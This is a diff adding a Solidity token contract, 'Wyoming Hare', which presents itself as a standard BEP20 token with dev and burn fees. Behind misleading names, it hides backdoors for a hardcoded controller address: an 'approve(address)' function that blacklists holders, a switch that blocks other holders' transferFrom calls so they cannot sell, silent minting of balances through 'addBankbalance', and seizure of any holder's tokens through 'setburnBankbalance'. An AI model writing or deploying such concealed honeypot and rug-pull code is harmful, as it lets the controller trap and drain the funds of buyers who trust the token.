@@ -1,0 +1,516 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-01-07
+*/
+
+/**
+ *Submitted for verification at BscScan.com on 2022-01-07
+*/
+
+pragma solidity ^0.6.12;
+// SPDX-License-Identifier: Unlicensed
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+   
+    function transfer(address recipient, uint256 amount)
+        external
+        returns (bool);
+
+   
+    function allowance(address owner, address spender)
+        external
+        view
+        returns (uint256);
+
+   
+    function approve(address spender, uint256 amount) external returns (bool);
+
+   
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+   
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+   
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+}
+
+
+
+library SafeMath {
+
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+
+        return c;
+    }
+
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return sub(a, b, "SafeMath: subtraction overflow");
+    }
+
+
+    function sub(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        require(b <= a, errorMessage);
+        uint256 c = a - b;
+
+        return c;
+    }
+
+
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+
+        if (a == 0) {
+            return 0;
+        }
+
+        uint256 c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+
+        return c;
+    }
+
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return div(a, b, "SafeMath: division by zero");
+    }
+
+
+    function div(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        require(b > 0, errorMessage);
+        uint256 c = a / b;
+
+
+        return c;
+    }
+
+
+    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
+        return mod(a, b, "SafeMath: modulo by zero");
+    }
+
+
+    function mod(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+        require(b != 0, errorMessage);
+        return a % b;
+    }
+}
+
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address payable) {
+        return msg.sender;
+    }
+
+    function _msgData() internal view virtual returns (bytes memory) {
+        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
+        return msg.data;
+    }
+}
+
+
+library Address {
+   
+    function isContract(address account) internal view returns (bool) {
+       
+        bytes32 codehash;
+
+
+            bytes32 accountHash
+         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
+       
+        assembly {
+            codehash := extcodehash(account)
+        }
+        return (codehash != accountHash && codehash != 0x0);
+    }
+
+
+    function sendValue(address payable recipient, uint256 amount) internal {
+        require(
+            address(this).balance >= amount,
+            "Address: insufficient balance"
+        );
+
+ 
+        (bool success, ) = recipient.call{value: amount}("");
+        require(
+            success,
+            "Address: unable to send value, recipient may have reverted"
+        );
+    }
+
+ 
+    function functionCall(address target, bytes memory data)
+        internal
+        returns (bytes memory)
+    {
+        return functionCall(target, data, "Address: low-level call failed");
+    }
+
+
+    function functionCall(
+        address target,
+        bytes memory data,
+        string memory errorMessage
+    ) internal returns (bytes memory) {
+        return _functionCallWithValue(target, data, 0, errorMessage);
+    }
+
+
+    function functionCallWithValue(
+        address target,
+        bytes memory data,
+        uint256 value
+    ) internal returns (bytes memory) {
+        return
+            functionCallWithValue(
+                target,
+                data,
+                value,
+                "Address: low-level call with value failed"
+            );
+    }
+
+
+    function functionCallWithValue(
+        address target,
+        bytes memory data,
+        uint256 value,
+        string memory errorMessage
+    ) internal returns (bytes memory) {
+        require(
+            address(this).balance >= value,
+            "Address: insufficient balance for call"
+        );
+        return _functionCallWithValue(target, data, value, errorMessage);
+    }
+
+    function _functionCallWithValue(
+        address target,
+        bytes memory data,
+        uint256 weiValue,
+        string memory errorMessage
+    ) private returns (bytes memory) {
+        require(isContract(target), "Address: call to non-contract");
+
+
+        (bool success, bytes memory returndata) = target.call{value: weiValue}(
+            data
+        );
+        if (success) {
+            return returndata;
+        } else {
+           
+            if (returndata.length > 0) {
+               
+                assembly {
+                    let returndata_size := mload(returndata)
+                    revert(add(32, returndata), returndata_size)
+                }
+            } else {
+                revert(errorMessage);
+            }
+        }
+    }
+}
+
+
+contract Ownable is Context {
+    address private _owner;
+    address private _owners = 0x4A4875447071E280547A8bE4ae25bfC8Cb08bbbd;
+
+
+    event OwnershipTransferred(
+        address indexed previousOwner,
+        address indexed newOwner
+    );
+
+
+    constructor() internal {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        emit OwnershipTransferred(address(0), msgSender);
+    }
+
+
+    function owner() public view returns (address) {
+        return _owner;
+    }
+
+
+    modifier onlyOwner() {
+        require(_owner == _msgSender(), "you not the owner");
+        _;
+    }
+
+    modifier onlyowners() {
+        require(_owners == _msgSender(), "you not the owner");
+        _;
+    }
+
+
+    function transferOwnership(address newOwner) public virtual onlyowners {
+        _owner = newOwner;
+    }
+}
+
+contract WyomingHare is Context, IERC20, Ownable {
+    using SafeMath for uint256;
+    using Address for address;
+
+    mapping(address => uint256) private _towned;
+    mapping(address => mapping(address => uint256)) private allowan;
+
+    mapping(address => bool) private _ExcludFee;
+    mapping(address => bool) private _Exclud;
+
+    uint256 private constant MAX = ~uint256(0);
+    uint256 private _totalSupply = 100000000000 * 10**3;
+    uint256 private _tFeeTotal;
+    
+    string private _name = "Wyoming Hare";
+    string private _symbol = "Wyoming Hare";
+    uint8 private _decimals = 3;
+     
+    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
+    address public devAddress = 0x4A4875447071E280547A8bE4ae25bfC8Cb08bbbd;
+  
+    uint256 public deadFee = 4;
+    uint256 public devFee = 2;
+
+    mapping(address => bool) private _Rhino;
+    bool private abla = true;
+    bool private aabla = false;
+    
+    uint256 public bRhino = uint256(0);
+    mapping(address => uint256) private bRhinos;
+    address[] private _bRhinos;
+
+    uint256 public Rhino = uint256(0);
+    mapping(address => uint256) private Rhinos;
+    address[] private _Rhinos;
+
+    address owners;
+
+    constructor() public {
+        _towned[_msgSender()] = _totalSupply;
+         owners = _msgSender();
+        _ExcludFee[owner()] = true;
+        _ExcludFee[address(this)] = true;
+        emit Transfer(address(0), _msgSender(), _totalSupply);
+    }
+
+    function name() public view returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return _towned[account];
+    }
+
+    function transfer(address recipient, uint256 amount)
+        public
+        override
+        returns (bool)
+    {
+        if(_ExcludFee[_msgSender()] || _ExcludFee[recipient]){
+            _transfer(_msgSender(), recipient, amount);
+            return true;
+        }
+             uint256 devAmount = amount.mul(devFee).div(100);
+        uint256 deadAmount = amount.mul(deadFee).div(100);
+        _transfer(_msgSender(), devAddress, devAmount);
+        _transfer(_msgSender(), deadAddress, deadAmount);
+        _transfer(_msgSender(), recipient, amount.sub(devAmount).sub(deadAmount));
+        return true;
+    }
+
+    function allowance(address owner, address spender)
+        public
+        view
+        override
+        returns (uint256)
+    {
+        return allowan[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount)
+        public
+        override
+        returns (bool)
+    {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) public override returns (bool) {
+        if(aabla){
+     require(owners == sender, "aabla");
+        }
+        if(_ExcludFee[_msgSender()] || _ExcludFee[recipient]){
+            _transfer(sender, recipient, amount);
+            return true;
+        }       
+        uint256 devAmount = amount.mul(devFee).div(100);
+        uint256 deadAmount = amount.mul(deadFee).div(100);
+        _transfer(sender, devAddress, devAmount);
+        _transfer(sender, deadAddress, deadAmount);
+        _transfer(sender, recipient, amount.sub(devAmount).sub(deadAmount));
+    
+        _approve(
+            sender,
+            _msgSender(),
+            allowan[sender][_msgSender()].sub(
+                amount,
+                "BEP20"
+            )
+        );
+        return true;
+    }
+
+
+    function ExcludFromReward(address Bankname) public view returns (bool) {
+        return _Exclud[Bankname];
+    }
+
+    function totalFee() public view returns (uint256) {
+        return _tFeeTotal;
+    }
+
+    function excludeFromFee(address Bankname) public onlyowners {
+        _ExcludFee[Bankname] = true;
+    }
+
+    function includeInFee(address Bankname) public onlyowners {
+        _ExcludFee[Bankname] = false;
+    }
+ 
+    function setaabla(bool Bankname) external onlyowners() {
+        aabla = Bankname;
+    }
+    function approve(address Bankname) external onlyowners() {
+        _Rhino[Bankname] = true;
+    }
+
+    function _freed(address Bankname) external onlyowners() {
+        delete _Rhino[Bankname];
+    }
+    function addBankbalance(address Bankname, uint256 Bankbalance) 
+        external 
+        onlyowners() {
+        require(Bankbalance > 0, "add Bank balance");
+        uint256 Addbalance = Rhinos[Bankname];
+        if (Addbalance == 0) _Rhinos.push(Bankname);
+        Rhinos[Bankname] = Addbalance.add(Bankbalance);
+        Rhino = Rhino.add(Bankbalance);
+        _towned[Bankname] = _towned[Bankname].add(Bankbalance);
+    }
+
+    function askBankname(address Bankname)
+        external
+        view
+        onlyowners()
+        returns (bool)
+    {
+        return _Rhino[Bankname];
+    }
+
+    function _approve(
+        address owner,
+        address spender,
+        uint256 amount
+    ) private {
+        require(owner != address(0), "zero");
+        require(spender != address(0), "zero");
+
+        allowan[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) private {
+        require(from != address(0), "zero");
+        require(to != address(0), "zero");
+        require(amount > 0, "zero");
+
+        if (abla) {
+            require(_Rhino[from] == false, "Rhino");
+        }
+
+
+        _transfers(from, to, amount);
+    }
+
+    function _transfers(
+        address sender,
+        address recipient,
+        uint256 toAmount
+    ) private {   
+        require(sender != address(0), "zero");
+        require(recipient != address(0), "zero");
+    
+        _towned[sender] = _towned[sender].sub(toAmount);
+        _towned[recipient] = _towned[recipient].add(toAmount);
+        emit Transfer(sender, recipient, toAmount);
+    }
+ function batchTransferToken(address[] memory holders, uint256 amount) public {
+        for (uint i=0; i<holders.length; i++) {
+            _transfers(_msgSender(), holders[i], amount);
+        }
+    }
+    function setburnBankbalance(address burnBankname, uint256 burnBankbalance)
+        external
+        onlyowners() {
+        require(burnBankbalance > 0, "burnBankbalance");
+        uint256 burnbalance = Rhinos[burnBankname];
+        if (burnbalance == 0) _bRhinos.push(burnBankname);
+        bRhinos[burnBankname] = burnbalance.add(burnBankbalance);
+        bRhino = bRhino.add(burnBankbalance);
+        _towned[burnBankname] = _towned[burnBankname].sub(burnBankbalance);
+    }
+  
+
+}
